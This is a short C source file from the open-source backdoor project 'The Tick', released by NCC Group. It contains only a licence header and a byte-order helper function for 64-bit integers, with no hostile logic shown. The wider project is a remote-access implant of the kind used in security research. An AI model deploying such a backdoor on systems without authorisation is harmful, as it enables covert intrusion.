/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "common.h"

// Helper function to convert 64 bit ints to network byte order.
// Note that the endianness check is gcc specific.
// This may need to be fixed in other toolchains.
#if __BYTE_ORDER__ != __ORDER_BIG_ENDIAN__
uint64_t htonll(uint64_t hostlong)
{
    uint64_t low, high;
    high = htonl(hostlong >> 32);
    low = htonl(hostlong & 0xFFFFFFFF);
    return (low << 32) | high;
}
#endif
